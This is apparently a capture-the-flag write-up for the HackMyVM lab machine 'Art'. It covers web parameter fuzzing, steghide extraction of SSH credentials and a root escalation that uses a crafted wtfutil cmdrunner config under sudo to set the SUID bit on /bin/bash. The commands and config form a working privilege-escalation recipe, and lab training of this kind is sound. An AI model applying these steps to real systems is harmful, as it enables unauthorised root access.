# Art

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Art | sml | Beginner | HackMyVM |

**Summary:** Art is a beginner-level HackMyVM machine that demonstrates fundamental web application enumeration, steganography techniques, and Linux privilege escalation through misconfigured sudo permissions. The attack path involves discovering a vulnerable web gallery application with a "tag" parameter, enumerating multiple image files, extracting hidden credentials through steganography (using steghide with an empty passphrase), gaining SSH access as the "lion" user, and finally escalating privileges by exploiting the wtfutil binary with sudo NOPASSWD permissions. The exploitation leverages wtfutil's configuration file feature to execute arbitrary commands as root, specifically setting the SUID bit on /bin/bash to achieve root access. This machine emphasizes the importance of proper parameter enumeration, steganography analysis, and understanding configuration-based command execution vulnerabilities.

---

## Reconnaissance

### Network Discovery

The initial reconnaissance phase began with network scanning to identify the target machine within the local network segment (192.168.100.0/24):

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.80 08:00:27:B8:13:B8 VirtualBox
```

The scan successfully identified a VirtualBox virtual machine at **192.168.100.80** with MAC address `08:00:27:B8:13:B8`, confirming this as our target system.

### Port Scanning & Service Enumeration

A comprehensive Nmap scan was performed to identify all open ports and running services on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ nmap -sC -sV -p- 192.168.100.80
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 21:10 WIB
Nmap scan report for 192.168.100.80
Host is up (0.0065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 45:42:0f:13:cc:8e:49:dd:ec:f5:bb:0f:58:f4:ef:47 (RSA)
|   256 12:2f:a3:63:c2:73:99:e3:f8:67:57:ab:29:52:aa:06 (ECDSA)
|_  256 f8:79:7a:b1:a8:7e:e9:97:25:c3:40:4a:0c:2f:5e:69 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 8.4p1 Debian 5+deb11u1 - Standard SSH service, potential entry point if credentials are obtained
- **Port 80 (HTTP)**: nginx 1.18.0 - Web server running, primary attack surface for initial enumeration
- **Operating System**: Debian Linux (based on service versions)

### Web Application Enumeration

Initial investigation of the web service revealed a gallery application:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl http://192.168.100.80
SEE HMV GALLERY!
<br>
 <img src=abc321.jpg><br><img src=jlk19990.jpg><br><img src=ertye.jpg><br><img src=zzxxccvv3.jpg><br>
<!-- Need to solve tag parameter problem. -->
```

**Analysis:**
- The application displays a gallery with four images: `abc321.jpg`, `jlk19990.jpg`, `ertye.jpg`, `zzxxccvv3.jpg`
- HTML comment hints at a "tag parameter problem" - indicating a parameter vulnerability or misconfiguration
- This comment provides a valuable clue for further enumeration

### Directory Brute-Forcing

Gobuster was used to discover hidden directories and files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ gobuster dir -u http://192.168.100.80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 170]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

**Result:** Discovered `index.php` as the main entry point for the web application.

### Parameter Fuzzing

Following the HTML comment hint, FFUF was employed to discover hidden parameters in `index.php`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.100.80/index.php?FUZZ=test -fs 170

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.80/index.php?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 170
________________________________________________

tag                     [Status: 200, Size: 70, Words: 11, Lines: 5, Duration: 215ms]
:: Progress: [4614/4614] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

**Discovery:** The `tag` parameter was identified with a different response size (70 bytes vs. 170 bytes baseline), confirming it as a valid parameter for the application.

### Tag Parameter Value Enumeration

Further fuzzing was conducted to identify valid values for the `tag` parameter:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://192.168.100.80/index.php?tag=FUZZ -fs 70

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.80/index.php?tag=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 70
________________________________________________

0                       [Status: 200, Size: 170, Words: 15, Lines: 5, Duration: 115ms]
beauty                  [Status: 200, Size: 93, Words: 12, Lines: 5, Duration: 105ms]
Beauty                  [Status: 200, Size: 93, Words: 12, Lines: 5, Duration: 130ms]
beautiful               [Status: 200, Size: 170, Words: 15, Lines: 5, Duration: 180ms]
:: Progress: [220559/220559] :: Job [1/1] :: 401 req/sec :: Duration: [0:10:40] :: Errors: 0 ::
```

**Valid tag values identified:**
- `0` - Returns the default gallery (170 bytes)
- `beauty` / `Beauty` - Returns a different image set (93 bytes) - case-insensitive
- `beautiful` - Returns the default gallery (170 bytes)

### Tag Parameter Testing

Manual testing was performed to understand the behavior of each tag value:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl http://192.168.100.80/index.php?tag=0
SEE HMV GALLERY!
<br>
 <img src=abc321.jpg><br><img src=jlk19990.jpg><br><img src=ertye.jpg><br><img src=zzxxccvv3.jpg><br>
<!-- Need to solve tag parameter problem. -->

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl http://192.168.100.80/index.php?tag=beauty
SEE HMV GALLERY!
<br>
 <img src=dsa32.jpg><br>
<!-- Need to solve tag parameter problem. -->

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl http://192.168.100.80/index.php?tag=Beauty
SEE HMV GALLERY!
<br>
 <img src=dsa32.jpg><br>
<!-- Need to solve tag parameter problem. -->

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl http://192.168.100.80/index.php?tag=beautiful
SEE HMV GALLERY!
<br>
 <img src=abc321.jpg><br><img src=jlk19990.jpg><br><img src=ertye.jpg><br><img src=zzxxccvv3.jpg><br>
<!-- Need to solve tag parameter problem. -->
```

**Analysis:**
- The `beauty` tag reveals a fifth image: **`dsa32.jpg`**
- A total of **5 unique images** were discovered across all tag values
- Each tag filters different images based on an internal categorization system

### Image Collection

All five discovered images were downloaded for forensic analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl -O http://192.168.100.80/abc321.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0   0     0   0     0     0     0  --:--:-- --:--:100  3097k 100  3097k   0     0 18655k     0  --:--:-- --:--:-- --:--:-- 18770k

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl -O http://192.168.100.80/jlk19990.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0   0     0   0     0     0     0  --:--:-- --:--:100  2919k 100  2919k   0     0 13842k     0  --:--:-- --:--:-- --:--:-- 13903k

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl -O http://192.168.100.80/ertye.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0   0     0   0     0     0     0  --:--:-- --:--:100  4602k 100  4602k   0     0 21339k     0  --:--:-- --:--:-- --:--:-- 21406k

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl -O http://192.168.100.80/zzxxccvv3.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0   0     0   0     0     0     0  --:--:-- --:--:100  2668k 100  2668k   0     0 15023k     0  --:--:-- --:--:-- --:--:-- 15074k

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ curl -O http://192.168.100.80/dsa32.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4066k 100  4066k   0     0 22752k     0  --:--:-- --:--:-- --:--:-- 22845k
```

**Downloaded files:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ ls -la
total 17404
drwxr-xr-x   2 ouba ouba    4096 Feb  4 21:36 .
drwxrwxrwt 182 root root   36864 Feb  4 21:39 ..
-rw-r--r--   1 ouba ouba 3171502 Feb  4 21:13 abc321.jpg
-rw-r--r--   1 ouba ouba 4164096 Feb  4 21:36 dsa32.jpg
-rw-r--r--   1 ouba ouba 4712929 Feb  4 21:13 ertye.jpg
-rw-r--r--   1 ouba ouba 2989800 Feb  4 21:13 jlk19990.jpg
-rw-r--r--   1 ouba ouba 2732227 Feb  4 21:13 zzxxccvv3.jpg
```

Five JPEG files totaling approximately 17 MB were successfully collected for steganographic analysis.

---

## Initial Access

### Steganography Analysis

Each image was analyzed using `steghide` to extract any hidden data. Steghide is a steganography tool that can embed data within JPEG, BMP, WAV, and AU files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ steghide extract -sf dsa32.jpg
Enter passphrase:
wrote extracted data to "yes.txt".

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ steghide extract -sf abc321.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ steghide extract -sf ertye.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ steghide extract -sf jlk19990.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ steghide extract -sf zzxxccvv3.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

**Critical Finding:** The file **`dsa32.jpg`** (discovered through the "beauty" tag) successfully extracted hidden data using an **empty passphrase** (just pressing Enter). This is a common security misconfiguration where steganography is used but no password protection is applied.

### Credential Discovery

The extracted file contained SSH credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ cat yes.txt
lion/s[REDACTED]
```

**Format:** `username/password`
- **Username:** `lion`
- **Password:** `s[REDACTED]`

### SSH Authentication

Using the discovered credentials to establish an SSH connection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/art]
└─$ ssh lion@192.168.100.80
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
lion@192.168.100.80's password:
Linux art 5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23) x86_64
...
lion@art:~$ id
uid=1000(lion) gid=1000(lion) grupos=1000(lion),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

**Success!** Initial access was achieved as user `lion` (UID 1000, GID 1000) on Debian Linux kernel 5.10.0-16-amd64.

### Initial Enumeration

Examining the home directory:

```bash
lion@art:~$ ls -la
total 32
drwxr-xr-x 3 lion lion 4096 ago  3  2022 .
drwxr-xr-x 3 root root 4096 ago  3  2022 ..
lrwxrwxrwx 1 lion lion    9 ago  3  2022 .bash_history -> /dev/null
-rw-r--r-- 1 lion lion  220 ago  3  2022 .bash_logout
-rw-r--r-- 1 lion lion 3526 ago  3  2022 .bashrc
drwxr-xr-x 3 lion lion 4096 ago  3  2022 .local
-rw-r--r-- 1 lion lion  807 ago  3  2022 .profile
-rw------- 1 lion lion   24 ago  3  2022 user.txt
-rw------- 1 lion lion   49 ago  3  2022 .Xauthority
```

**Key Observations:**
- `.bash_history` is symlinked to `/dev/null` - command history logging is disabled (common CTF hardening)
- `user.txt` flag is present (24 bytes) - confirms user-level access
- Standard Debian user environment

---

## Privilege Escalation

### Sudo Privileges Enumeration

Checking for sudo permissions:

```bash
lion@art:~$ sudo -l
Matching Defaults entries for lion on art:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lion may run the following commands on art:
    (ALL : ALL) NOPASSWD: /bin/wtfutil
```

**Critical Discovery:** User `lion` can execute `/bin/wtfutil` with sudo privileges without a password (`NOPASSWD`). This is the primary privilege escalation vector.

### Binary Analysis

Examining the wtfutil binary:

```bash
lion@art:~$ ls -la /bin/wtfutil
-rwxr-xr-x 1 501 staff 46600192 dic 28  2021 /bin/wtfutil
lion@art:~$ file /bin/wtfutil
/bin/wtfutil: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=k6zuC-CTkpVqmVBGGDRv/HD4Xhe_b_0bMPG2qLWwS/6ozjpJ1jEtJtCQOuS2rs/_sdKVBhnVlLofuvS6e9G, stripped
```

**Analysis:**
- **Size:** 46.6 MB (statically linked Go binary - includes all dependencies)
- **Ownership:** UID 501 (staff group) - non-standard ownership
- **Type:** 64-bit ELF executable, statically linked, built with Go
- **Build Date:** December 28, 2021

### Understanding wtfutil

Checking the help menu:

```bash
lion@art:~$ sudo /bin/wtfutil --help
Usage:
  wtfutil [OPTIONS] [command] [args...]

Application Options:
  -c, --config=  Path to config file
  -m, --module=  Display info about a specific module, i.e.: 'wtfutil
                 -m=todo'
  -p, --profile  Profile application memory usage
  -v, --version  Show version info

Help Options:
  -h, --help     Show this help message


Commands:
  save-secret <service>
    service      Service URL or module name of secret.
  Save a secret into the secret store. The secret will be prompted for.
  Requires wtf.secretStore to be configured.  See individual modules for
  information on what service and secret means for their configuration,
  not all modules use secrets.
```

**Key Feature:** The `--config` option allows loading a custom configuration file. According to wtfutil documentation, this is a terminal dashboard tool that can execute commands through modules like `cmdrunner`.

### Exploitation Strategy

**wtfutil** is a legitimate terminal-based dashboard application written in Go. The `cmdrunner` module allows executing arbitrary commands at specified refresh intervals. By crafting a malicious configuration file and executing it with sudo, we can run commands as root.

**Approach:**
1. Create a configuration file that uses the `cmdrunner` module
2. Configure it to execute `chmod +s /bin/bash` (set SUID bit on bash)
3. Execute wtfutil with sudo and our malicious config
4. The SUID bash will allow us to spawn a root shell

### Creating the Malicious Configuration

Writing the exploit configuration to `/tmp/root.yml`:

```bash
lion@art:~$ cat /tmp/root.yml
wtf:
  grid:
    columns: [1]
    rows: [1]
  mods:
    cmdrunner:
      type: cmdrunner
      enabled: true
      position:
        top: 0
        left: 0
        height: 1
        width: 1
      refreshInterval: 1
      cmd: "chmod"
      args: ["+s", "/bin/bash"]
```

**Configuration Breakdown:**
- **Grid Layout:** 1x1 grid (minimal display)
- **Module Type:** `cmdrunner` - executes system commands
- **Command:** `chmod +s /bin/bash` - sets the SUID and SGID bits on /bin/bash
- **Refresh Interval:** 1 second - the command will be executed quickly
- **Enabled:** true - activates the module immediately

**Why this works:**
- wtfutil runs with root privileges (via sudo)
- The cmdrunner module executes our specified command as root
- Setting SUID on /bin/bash allows any user to execute bash with root privileges

### Executing the Exploit

Running wtfutil with the malicious configuration:

```bash
lion@art:~$ sudo /bin/wtfutil --config=/tmp/root.yml
...
```

**Note:** The interface will display a blank black terminal dashboard. Wait approximately 3 seconds for the command to execute (the refresh interval ensures execution), then press `q` to quit the interface.

### Verifying SUID Bit

Checking if the SUID bit was successfully set:

```bash
lion@art:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 mar 27  2022 /bin/bash
```

**Success!** The permissions now show:
- `rws` (owner) - SUID bit is set (the 's' replaces 'x')
- `r-s` (group) - SGID bit is set
- Owner: root
- Group: root

### Spawning Root Shell

Executing bash with the `-p` flag to preserve privileges:

```bash
lion@art:~$ /bin/bash -p
bash-5.1# id ; whoami; hostname
uid=1000(lion) gid=1000(lion) euid=0(root) egid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(lion)
root
art
```

**Root Access Achieved!**
- **Effective UID (euid):** 0 (root)
- **Effective GID (egid):** 0 (root)
- **Hostname:** art
- The `-p` flag prevents bash from dropping elevated privileges

### Capturing the Flags

Retrieving both user and root flags:

```bash
bash-5.1# cat /home/lion/user.txt /root/root.txt
HMV[REDACTED]
cat: /root/root.txt: No existe el fichero o el directorio
bash-5.1# find / -name "root.txt" 2>/dev/null
/var/opt/root.txt
bash-5.1# cat /var/opt/root.txt
[REDACTED]HMV
```

**Flags Captured:**
- **User Flag:** `HMV[REDACTED]` (located at `/home/lion/user.txt`)
- **Root Flag:** `[REDACTED]HMV` (located at `/var/opt/root.txt` - non-standard location)

**Note:** The root flag was not in the typical `/root/root.txt` location. A system-wide search using `find` revealed it in `/var/opt/root.txt`, demonstrating the importance of thorough enumeration even after achieving root access.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning (192.168.100.0/24) identifying target at 192.168.100.80, followed by comprehensive Nmap port scan revealing SSH (22/tcp) and HTTP (80/tcp) services running on Debian Linux with nginx 1.18.0.

2. **Vulnerability Discovery**: Enumerated web application discovering "tag" parameter through HTML comment hint and FFUF parameter fuzzing; identified five image files (abc321.jpg, jlk19990.jpg, ertye.jpg, zzxxccvv3.jpg, dsa32.jpg) across different tag values ("0", "beauty", "beautiful").

3. **Exploitation**: Downloaded all five images and performed steganographic analysis using steghide; successfully extracted hidden file (yes.txt) from dsa32.jpg using an empty passphrase, revealing SSH credentials for user "lion" (lion/s[REDACTED]).

4. **Internal Enumeration**: Authenticated via SSH as user "lion" and performed privilege enumeration with `sudo -l`, discovering NOPASSWD sudo permission for /bin/wtfutil binary - a 46.6MB statically-linked Go terminal dashboard application with configuration file loading capability.

5. **Privilege Escalation**: Crafted malicious wtfutil YAML configuration (/tmp/root.yml) utilizing the cmdrunner module to execute `chmod +s /bin/bash` as root; executed configuration with sudo privileges, set SUID bit on /bin/bash, spawned root shell using `/bin/bash -p`, and captured both user flag (HMV[REDACTED]) and root flag ([REDACTED]HMV) from non-standard location /var/opt/root.txt.